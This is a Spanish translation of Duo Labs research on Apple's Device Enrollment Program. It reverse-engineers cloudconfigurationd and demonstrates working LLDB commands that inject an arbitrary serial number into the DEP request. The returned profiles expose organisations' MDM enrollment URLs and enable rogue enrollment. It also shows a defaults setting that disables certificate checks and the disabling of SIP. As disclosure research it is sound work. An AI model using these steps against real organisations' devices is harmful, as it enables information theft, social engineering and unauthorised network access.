# Introducción

Como se comentó anteriormente, para intentar inscribir un dispositivo en una organización solo se necesita un número de serie que pertenezca a esa organización. Una vez que el dispositivo está inscrito, varias organizaciones instalarán datos sensibles en el nuevo dispositivo: certificados, aplicaciones, contraseñas de WiFi, configuraciones de VPN [y así sucesivamente](https://developer.apple.com/enterprise/documentation/Configuration-Profile-Reference.pdf). Por lo tanto, esto podría ser un punto de entrada peligroso para los atacantes si el proceso de inscripción no está protegido correctamente.

**La siguiente investigación se toma de** [**https://duo.com/labs/research/mdm-me-maybe**](https://duo.com/labs/research/mdm-me-maybe)

# Reversión del proceso

## Binarios involucrados en DEP y MDM

A lo largo de nuestra investigación, exploramos lo siguiente:

* **`mdmclient`**: Utilizado por el sistema operativo para comunicarse con un servidor MDM. En macOS 10.13.3 y anteriores, también se puede utilizar para activar una comprobación de DEP.
* **`profiles`**: Una utilidad que se puede utilizar para instalar, eliminar y ver perfiles de configuración en macOS. También se puede utilizar para activar una comprobación de DEP en macOS 10.13.4 y versiones posteriores.
* **`cloudconfigurationd`**: El demonio del cliente de inscripción de dispositivos, que es responsable de comunicarse con la API de DEP y recuperar perfiles de inscripción de dispositivos.

Cuando se utiliza `mdmclient` o `profiles` para iniciar una comprobación de DEP, se utilizan las funciones `CPFetchActivationRecord` y `CPGetActivationRecord` para recuperar el _Registro de activación_. `CPFetchActivationRecord` delega el control a `cloudconfigurationd` a través de [XPC](https://developer.apple.com/documentation/xpc), que luego recupera el _Registro de activación_ de la API de DEP.

`CPGetActivationRecord` recupera el _Registro de activación_ de la caché, si está disponible. Estas funciones están definidas en el marco de perfiles de configuración privados, ubicado en `/System/Library/PrivateFrameworks/Configuration Profiles.framework`.

## Reversión del protocolo Tesla y el esquema Absinthe

Durante el proceso de comprobación de DEP, `cloudconfigurationd` solicita un _Registro de activación_ de _iprofiles.apple.com/macProfile_. La carga útil de la solicitud es un diccionario JSON que contiene dos pares de clave-valor:
```
{
"sn": "",
action": "RequestProfileConfiguration
}
```
El payload está firmado y encriptado usando un esquema referido internamente como "Absinthe". El payload encriptado es luego codificado en Base 64 y utilizado como cuerpo de la solicitud en un HTTP POST a _iprofiles.apple.com/macProfile_.

En `cloudconfigurationd`, la obtención del _Activation Record_ es manejada por la clase `MCTeslaConfigurationFetcher`. El flujo general desde `[MCTeslaConfigurationFetcher enterState:]` es el siguiente:
```
rsi = @selector(verifyConfigBag);
rsi = @selector(startCertificateFetch);
rsi = @selector(initializeAbsinthe);
rsi = @selector(startSessionKeyFetch);
rsi = @selector(establishAbsintheSession);
rsi = @selector(startConfigurationFetch);
rsi = @selector(sendConfigurationInfoToRemote);
rsi = @selector(sendFailureNoticeToRemote);
```
Dado que el esquema **Absinthe** es lo que parece ser utilizado para autenticar solicitudes al servicio DEP, **invertir ingeniería** este esquema nos permitiría hacer nuestras propias solicitudes autenticadas a la API DEP. Sin embargo, esto resultó ser **consumidor de tiempo**, principalmente debido al número de pasos involucrados en la autenticación de solicitudes. En lugar de revertir completamente cómo funciona este esquema, optamos por explorar otros métodos para insertar números de serie arbitrarios como parte de la solicitud de _Registro de Activación_.

## MITMing Solicitudes DEP

Exploramos la viabilidad de interceptar solicitudes de red a _iprofiles.apple.com_ con [Charles Proxy](https://www.charlesproxy.com). Nuestro objetivo era inspeccionar la carga útil enviada a _iprofiles.apple.com/macProfile_, luego insertar un número de serie arbitrario y reproducir la solicitud. Como se mencionó anteriormente, la carga útil enviada a ese punto final por `cloudconfigurationd` está en formato [JSON](https://www.json.org) y contiene dos pares de clave-valor.
```
{
"action": "RequestProfileConfiguration",
sn": "
}
```
Dado que la API en _iprofiles.apple.com_ utiliza [Transport Layer Security](https://en.wikipedia.org/wiki/Transport\_Layer\_Security) (TLS), necesitamos habilitar SSL Proxying en Charles para ese host para ver el contenido de texto sin formato de las solicitudes SSL.

Sin embargo, el método `-[MCTeslaConfigurationFetcher connection:willSendRequestForAuthenticationChallenge:]` verifica la validez del certificado del servidor y abortará si no se puede verificar la confianza del servidor.
```
[ERROR] Unable to get activation record: Error Domain=MCCloudConfigurationErrorDomain Code=34011
"The Device Enrollment server trust could not be verified. Please contact your system
administrator." UserInfo={USEnglishDescription=The Device Enrollment server trust could not be
verified. Please contact your system administrator., NSLocalizedDescription=The Device Enrollment
server trust could not be verified. Please contact your system administrator.,
MCErrorType=MCFatalError}
```
El mensaje de error mostrado arriba se encuentra en un archivo binario _Errors.strings_ con la clave `CLOUD_CONFIG_SERVER_TRUST_ERROR`, el cual está ubicado en `/System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings`, junto con otros mensajes de error relacionados.
```
$ cd /System/Library/CoreServices
$ rg "The Device Enrollment server trust could not be verified"
ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
<snip>
```
El archivo _Errors.strings_ se puede [imprimir en un formato legible por humanos](https://duo.com/labs/research/mdm-me-maybe#error\_strings\_output) con el comando `plutil` incorporado.
```
$ plutil -p /System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
```
Después de investigar más a fondo la clase `MCTeslaConfigurationFetcher`, sin embargo, quedó claro que este comportamiento de confianza del servidor puede ser eludido habilitando la opción de configuración `MCCloudConfigAcceptAnyHTTPSCertificate` en el dominio de preferencias `com.apple.ManagedClient.cloudconfigurationd`.
```
loc_100006406:
rax = [NSUserDefaults standardUserDefaults];
rax = [rax retain];
r14 = [rax boolForKey:@"MCCloudConfigAcceptAnyHTTPSCertificate"];
r15 = r15;
[rax release];
if (r14 != 0x1) goto loc_10000646f;
```
La opción de configuración `MCCloudConfigAcceptAnyHTTPSCertificate` se puede establecer con el comando `defaults`.
```
sudo defaults write com.apple.ManagedClient.cloudconfigurationd MCCloudConfigAcceptAnyHTTPSCertificate -bool yes
```
Con SSL Proxying habilitado para _iprofiles.apple.com_ y `cloudconfigurationd` configurado para aceptar cualquier certificado HTTPS, intentamos realizar un ataque man-in-the-middle y reproducir las solicitudes en Charles Proxy.

Sin embargo, dado que la carga incluida en el cuerpo de la solicitud HTTP POST a _iprofiles.apple.com/macProfile_ está firmada y cifrada con Absinthe (`NACSign`), **no es posible modificar el texto plano de la carga JSON para incluir un número de serie arbitrario sin tener también la clave para descifrarla**. Aunque sería posible obtener la clave porque permanece en la memoria, en su lugar pasamos a explorar `cloudconfigurationd` con el depurador [LLDB](https://lldb.llvm.org).

## Instrumentando Binarios del Sistema que Interactúan con DEP

El último método que exploramos para automatizar el proceso de enviar números de serie arbitrarios a _iprofiles.apple.com/macProfile_ fue instrumentar binarios nativos que interactúan directa o indirectamente con la API DEP. Esto implicó una exploración inicial de `mdmclient`, `profiles` y `cloudconfigurationd` en [Hopper v4](https://www.hopperapp.com) y [Ida Pro](https://www.hex-rays.com/products/ida/), y algunas largas sesiones de depuración con `lldb`.

Uno de los beneficios de este método sobre la modificación de los binarios y la resignación con nuestra propia clave es que evita algunas de las restricciones de permisos incorporadas en macOS que de otra manera podrían disuadirnos.

**Protección de Integridad del Sistema**

Para instrumentar binarios del sistema, (como `cloudconfigurationd`) en macOS, se debe desactivar [Protección de Integridad del Sistema](https://support.apple.com/en-us/HT204899) (SIP). SIP es una tecnología de seguridad que protege los archivos, carpetas y procesos de nivel del sistema contra manipulaciones, y está habilitada de forma predeterminada en OS X 10.11 "El Capitan" y versiones posteriores. [SIP se puede desactivar](https://developer.apple.com/library/archive/documentation/Security/Conceptual/System\_Integrity\_Protection\_Guide/ConfiguringSystemIntegrityProtection/ConfiguringSystemIntegrityProtection.html) arrancando en modo de recuperación y ejecutando el siguiente comando en la aplicación Terminal, y luego reiniciando:
```
csrutil enable --without debug
```
Vale la pena señalar, sin embargo, que SIP es una característica de seguridad útil y no debe desactivarse excepto para fines de investigación y pruebas en máquinas no productivas. También es posible (y recomendable) hacer esto en Máquinas Virtuales no críticas en lugar de en el sistema operativo host.

**Instrumentación binaria con LLDB**

Con SIP desactivado, pudimos avanzar con la instrumentación de las binarias del sistema que interactúan con la API DEP, es decir, la binaria `cloudconfigurationd`. Debido a que `cloudconfigurationd` requiere privilegios elevados para ejecutarse, necesitamos iniciar `lldb` con `sudo`.
```
$ sudo lldb
(lldb) process attach --waitfor --name cloudconfigurationd
```
Mientras `lldb` está esperando, podemos adjuntarnos a `cloudconfigurationd` ejecutando `sudo /usr/libexec/mdmclient dep nag` en una ventana de Terminal separada. Una vez adjuntado, se mostrará una salida similar a la siguiente y se podrán escribir comandos de LLDB en el indicador.
```
Process 861 stopped
* thread #1, stop reason = signal SIGSTOP
<snip>
Target 0: (cloudconfigurationd) stopped.

Executable module set to "/usr/libexec/cloudconfigurationd".
Architecture set to: x86_64h-apple-macosx.
(lldb)
```
**Estableciendo el número de serie del dispositivo**

Una de las primeras cosas que buscamos al revertir `mdmclient` y `cloudconfigurationd` fue el código responsable de recuperar el número de serie del sistema, ya que sabíamos que el número de serie era en última instancia responsable de autenticar el dispositivo. Nuestro objetivo era modificar el número de serie en la memoria después de que se recupera del [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), y que se use cuando `cloudconfigurationd` construye la carga útil `macProfile`.

Aunque `cloudconfigurationd` es en última instancia responsable de comunicarse con la API DEP, también investigamos si el número de serie del sistema se recupera o se utiliza directamente dentro de `mdmclient`. El número de serie recuperado como se muestra a continuación no es el que se envía a la API DEP, pero reveló un número de serie codificado en duro que se utiliza si se habilita una opción de configuración específica.
```
int sub_10002000f() {
if (sub_100042b6f() != 0x0) {
r14 = @"2222XXJREUF";
}
else {
rax = IOServiceMatching("IOPlatformExpertDevice");
rax = IOServiceGetMatchingServices(*(int32_t *)*_kIOMasterPortDefault, rax, &var_2C);
<snip>
}
rax = r14;
return rax;
}
```
El número de serie del sistema se obtiene de [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), a menos que el valor de retorno de `sub_10002000f` no sea cero, en cuyo caso se establece en la cadena estática "2222XXJREUF". Al inspeccionar esa función, parece verificar si está habilitado el "modo de prueba de estrés del servidor".
```
void sub_1000321ca(void * _block) {
if (sub_10002406f() != 0x0) {
*(int8_t *)0x100097b68 = 0x1;
sub_10000b3de(@"Server stress test mode enabled", rsi, rdx, rcx, r8, r9, stack[0]);
}
return;
}
```
Documentamos la existencia del "modo de prueba de estrés del servidor", pero no lo exploramos más, ya que nuestro objetivo era modificar el número de serie presentado a la API DEP. En su lugar, probamos si modificar el número de serie apuntado por el registro `r14` sería suficiente para recuperar un "Registro de activación" que no estaba destinado a la máquina en la que estábamos probando.

A continuación, examinamos cómo se recupera el número de serie del sistema dentro de `cloudconfigurationd`.
```
int sub_10000c100(int arg0, int arg1, int arg2, int arg3) {
var_50 = arg3;
r12 = arg2;
r13 = arg1;
r15 = arg0;
rbx = IOServiceGetMatchingService(*(int32_t *)*_kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
r14 = 0xffffffffffff541a;
if (rbx != 0x0) {
rax = sub_10000c210(rbx, @"IOPlatformSerialNumber", 0x0, &var_30, &var_34);
r14 = rax;
<snip>
}
rax = r14;
return rax;
}
```
Como se puede ver arriba, el número de serie se recupera de [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) en `cloudconfigurationd` también.

Usando `lldb`, pudimos modificar el número de serie recuperado de [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) estableciendo un punto de interrupción para `IOServiceGetMatchingService` y creando una nueva variable de cadena que contenga un número de serie arbitrario y reescribiendo el registro `r14` para que apunte a la dirección de memoria de la variable que creamos.
```
(lldb) breakpoint set -n IOServiceGetMatchingService
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --waitfor --name cloudconfigurationd
Process 2208 stopped
* thread #2, queue = 'com.apple.NSXPCListener.service.com.apple.ManagedClient.cloudconfigurationd',
stop reason = instruction step over frame #0: 0x000000010fd824d8
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd + 73
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd:
->  0x10fd824d8 <+73>: movl   %ebx, %edi
0x10fd824da <+75>: callq  0x10ffac91e               ; symbol stub for: IOObjectRelease
0x10fd824df <+80>: testq  %r14, %r14
0x10fd824e2 <+83>: jne    0x10fd824e7               ; <+88>
Target 0: (cloudconfigurationd) stopped.
(lldb) continue  # Will hit breakpoint at `IOServiceGetMatchingService`
# Step through the program execution by pressing 'n' a bunch of times and
# then 'po $r14' until we see the serial number.
(lldb) n
(lldb) po $r14
C02JJPPPQQQRR  # The system serial number retrieved from the `IORegistry`
# Create a new variable containing an arbitrary serial number and print the memory address.
(lldb) p/x @"C02XXYYZZNNMM"
(__NSCFString *) $79 = 0x00007fb6d7d05850 @"C02XXYYZZNNMM"
# Rewrite the `r14` register to point to our new variable.
(lldb) register write $r14 0x00007fb6d7d05850
(lldb) po $r14
# Confirm that `r14` contains the new serial number.
C02XXYYZZNNMM
```
Aunque logramos modificar el número de serie obtenido de [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), el payload `macProfile` todavía contenía el número de serie del sistema, no el que escribimos en el registro `r14`.

**Exploit: Modificar el diccionario de solicitud de perfil antes de la serialización JSON**

A continuación, intentamos establecer el número de serie que se envía en el payload `macProfile` de una manera diferente. Esta vez, en lugar de modificar el número de serie del sistema obtenido a través de [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), intentamos encontrar el punto más cercano en el código donde el número de serie todavía está en texto plano antes de ser firmado con Absinthe (`NACSign`). El mejor punto para mirar parecía ser `-[MCTeslaConfigurationFetcher startConfigurationFetch]`, que realiza aproximadamente los siguientes pasos:

* Crea un nuevo objeto `NSMutableData`
* Llama a `[MCTeslaConfigurationFetcher setConfigurationData:]`, pasándole el nuevo objeto `NSMutableData`
* Llama a `[MCTeslaConfigurationFetcher profileRequestDictionary]`, que devuelve un objeto `NSDictionary` que contiene dos pares clave-valor:
* `sn`: El número de serie del sistema
* `action`: La acción remota a realizar (con `sn` como argumento)
* Llama a `[NSJSONSerialization dataWithJSONObject:]`, pasándole el `NSDictionary` de `profileRequestDictionary`
* Firma la carga útil JSON usando Absinthe (`NACSign`)
* Codifica en Base64 la carga útil JSON firmada
* Establece el método HTTP en `POST`
* Establece el cuerpo HTTP en la carga útil JSON firmada y codificada en Base64
* Establece el encabezado HTTP `X-Profile-Protocol-Version` en `1`
* Establece el encabezado HTTP `User-Agent` en `ConfigClient-1.0`
* Utiliza el método `[NSURLConnection alloc] initWithRequest:delegate:startImmediately:]` para realizar la solicitud HTTP

Luego modificamos el objeto `NSDictionary` devuelto por `profileRequestDictionary` antes de ser convertido en JSON. Para hacer esto, se estableció un punto de interrupción en `dataWithJSONObject` para acercarnos lo más posible a los datos aún no convertidos. El punto de interrupción tuvo éxito y cuando imprimimos el contenido del registro que conocíamos a través del desensamblaje (`rdx`), sabíamos que obtuvimos los resultados que esperábamos ver.
```
po $rdx
{
action = RequestProfileConfiguration;
sn = C02XXYYZZNNMM;
}
```
Lo anterior es una representación con formato de `NSDictionary` devuelto por `[MCTeslaConfigurationFetcher profileRequestDictionary]`. Nuestro siguiente desafío fue modificar el `NSDictionary` en memoria que contenía el número de serie.
```
(lldb) breakpoint set -r "dataWithJSONObject"
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --name "cloudconfigurationd" --waitfor
Process 3291 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x00007fff2e8bfd8f Foundation`+[NSJSONSerialization dataWithJSONObject:options:error:]
Target 0: (cloudconfigurationd) stopped.
# Hit next breakpoint at `dataWithJSONObject`, since the first one isn't where we need to change the serial number.
(lldb) continue
# Create a new variable containing an arbitrary `NSDictionary` and print the memory address.
(lldb) p/x (NSDictionary *)[[NSDictionary alloc] initWithObjectsAndKeys:@"C02XXYYZZNNMM", @"sn",
@"RequestProfileConfiguration", @"action", nil]
(__NSDictionaryI *) $3 = 0x00007ff068c2e5a0 2 key/value pairs
# Confirm that `rdx` contains the new `NSDictionary`.
po $rdx
{
action = RequestProfileConfiguration;
sn = <new_serial_number>
}
```
La lista anterior realiza lo siguiente:

* Crea un punto de interrupción de expresión regular para el selector `dataWithJSONObject`
* Espera a que el proceso `cloudconfigurationd` se inicie y luego se conecta a él
* Continúa la ejecución del programa (porque el primer punto de interrupción que encontramos para `dataWithJSONObject` no es el que se llama en `profileRequestDictionary`)
* Crea e imprime (en formato hexadecimal debido a `/x`) el resultado de crear nuestro `NSDictionary` arbitrario
* Como ya conocemos los nombres de las claves requeridas, simplemente podemos establecer el número de serie en uno de nuestra elección para `sn` y dejar `action` igual
* La impresión del resultado de crear este nuevo `NSDictionary` nos indica que tenemos dos pares clave-valor en una ubicación de memoria específica

Nuestro último paso fue repetir el mismo paso de escribir en `rdx` la ubicación de memoria de nuestro objeto `NSDictionary` personalizado que contiene nuestro número de serie elegido:
```
(lldb) register write $rdx 0x00007ff068c2e5a0  # Rewrite the `rdx` register to point to our new variable
(lldb) continue
```
Esto apunta el registro `rdx` a nuestro nuevo `NSDictionary` justo antes de que se serialice a [JSON](https://www.json.org) y se envíe mediante `POST` a _iprofiles.apple.com/macProfile_, luego se continúa el flujo del programa.

Este método de modificar el número de serie en el diccionario de solicitud de perfil antes de ser serializado a JSON funcionó. Al usar un número de serie de Apple registrado en DEP conocido en lugar de (null), el registro de depuración para `ManagedClient` mostró el perfil completo de DEP para el dispositivo:
```
Apr  4 16:21:35[660:1]:+CPFetchActivationRecord fetched configuration:
{
AllowPairing = 1;
AnchorCertificates =     (
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://some.url/cloudenroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "Org address";
OrganizationAddressLine1 = "More address";
OrganizationAddressLine2 = NULL;
OrganizationCity = A City;
OrganizationCountry = US;
OrganizationDepartment = "Org Dept";
OrganizationEmail = "dep.management@org.url";
OrganizationMagic = <unique string>;
OrganizationName = "ORG NAME";
OrganizationPhone = "+1551234567";
OrganizationSupportPhone = "+15551235678";
OrganizationZipCode = "ZIPPY";
SkipSetup =     (
AppleID,
Passcode,
Zoom,
Biometric,
Payment,
TOS,
TapToSetup,
Diagnostics,
HomeButtonSensitivity,
Android,
Siri,
DisplayTone,
ScreenSaver
);
SupervisorHostCertificates =     (
);
}
```
Con solo unos pocos comandos `lldb`, podemos insertar con éxito un número de serie arbitrario y obtener un perfil DEP que incluye varios datos específicos de la organización, incluida la URL de inscripción de MDM de la organización. Como se discutió, esta URL de inscripción podría usarse para inscribir un dispositivo malintencionado ahora que conocemos su número de serie. Los otros datos podrían usarse para ingeniería social de una inscripción malintencionada. Una vez inscrito, el dispositivo podría recibir cualquier cantidad de certificados, perfiles, aplicaciones, configuraciones de VPN, etc.

## Automatización de la instrumentación de `cloudconfigurationd` con Python

Una vez que tuvimos la prueba de concepto inicial que demostraba cómo recuperar un perfil DEP válido usando solo un número de serie, nos propusimos automatizar este proceso para mostrar cómo un atacante podría abusar de esta debilidad en la autenticación.

Afortunadamente, la API de LLDB está disponible en Python a través de una [interfaz de puente de script](https://lldb.llvm.org/python-reference.html). En sistemas macOS con las [Herramientas de línea de comandos de Xcode](https://developer.apple.com/download/more/) instaladas, el módulo Python `lldb` se puede importar de la siguiente manera:
```
import lldb
```
Esto hizo relativamente fácil crear un script de prueba de concepto que demuestra cómo insertar un número de serie registrado en DEP y recibir un perfil DEP válido a cambio. El PoC que desarrollamos toma una lista de números de serie separados por saltos de línea e inyecta en el proceso `cloudconfigurationd` para verificar los perfiles DEP.

![Configuración de proxy SSL de Charles.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2NoYXJsZXNfc3NsX3Byb3h5aW5nX3NldHRpbmdzLnBuZw==?w=800\&fit=contain\&s=d1c9216716bf619e7e10e45c9968f83b)

![Notificación de DEP.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2RlcF9ub3RpZmljYXRpb24ucG5n?w=800\&fit=contain\&s=4f7b95efd02245f9953487dcaac6a961)

## Impacto

Existen varios escenarios en los que se podría abusar del Programa de Inscripción de Dispositivos de Apple que llevarían a exponer información sensible sobre una organización. Los dos escenarios más obvios implican obtener información sobre la organización a la que pertenece un dispositivo, que se puede recuperar del perfil DEP. El segundo es utilizar esta información para realizar una inscripción DEP y MDM falsa. Cada uno de estos se discute más adelante.

### Divulgación de información

Como se mencionó anteriormente, parte del proceso de inscripción en DEP implica solicitar y recibir un _Registro de Activación_ (o perfil DEP) de la API de DEP. Al proporcionar un número de serie del sistema registrado en DEP válido, podemos recuperar la siguiente información (impresa en `stdout` o escrita en el registro de `ManagedClient`, dependiendo de la versión de macOS).
```
Activation record: {
AllowPairing = 1;
AnchorCertificates =     (
<array_of_der_encoded_certificates>
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://example.com/enroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "123 Main Street, Anywhere, , 12345 (USA)";
OrganizationAddressLine1 = "123 Main Street";
OrganizationAddressLine2 = NULL;
OrganizationCity = Anywhere;
OrganizationCountry = USA;
OrganizationDepartment = "IT";
OrganizationEmail = "dep@example.com";
OrganizationMagic = 105CD5B18CE24784A3A0344D6V63CD91;
OrganizationName = "Example, Inc.";
OrganizationPhone = "+15555555555";
OrganizationSupportPhone = "+15555555555";
OrganizationZipCode = "12345";
SkipSetup =     (
<array_of_setup_screens_to_skip>
);
SupervisorHostCertificates =     (
);
}
```
Aunque parte de esta información podría estar disponible públicamente para ciertas organizaciones, tener un número de serie de un dispositivo propiedad de la organización junto con la información obtenida del perfil DEP podría ser utilizado contra el equipo de ayuda o IT de una organización para realizar cualquier número de ataques de ingeniería social, como solicitar un restablecimiento de contraseña o ayuda para inscribir un dispositivo en el servidor MDM de la empresa.

### Inscripción DEP fraudulenta

El protocolo MDM de Apple admite, pero no requiere, la autenticación de usuario antes de la inscripción MDM a través de la autenticación básica HTTP. **Sin autenticación, todo lo que se requiere para inscribir un dispositivo en un servidor MDM a través de DEP es un número de serie registrado en DEP**. Por lo tanto, un atacante que obtenga dicho número de serie (ya sea a través de OSINT, ingeniería social o por fuerza bruta) podrá inscribir un dispositivo propio como si fuera propiedad de la organización, siempre y cuando no esté actualmente inscrito en el servidor MDM. Esencialmente, si un atacante es capaz de ganar la carrera iniciando la inscripción DEP antes que el dispositivo real, pueden asumir la identidad de ese dispositivo.

Las organizaciones pueden, y lo hacen, aprovechar MDM para implementar información sensible como certificados de dispositivo y usuario, datos de configuración de VPN, agentes de inscripción, perfiles de configuración y varios otros datos internos y secretos organizacionales. Además, algunas organizaciones eligen no requerir la autenticación de usuario como parte de la inscripción MDM. Esto tiene varios beneficios, como una mejor experiencia de usuario y no tener que exponer el servidor de autenticación interno al servidor MDM para manejar las inscripciones MDM que tienen lugar fuera de la red corporativa.

Esto presenta un problema al aprovechar DEP para arrancar la inscripción MDM, ya que un atacante podría inscribir cualquier punto final de su elección en el servidor MDM de la organización. Además, una vez que un atacante inscribe con éxito un punto final de su elección en MDM, puede obtener acceso privilegiado que podría ser utilizado para pivotar aún más dentro de la red.
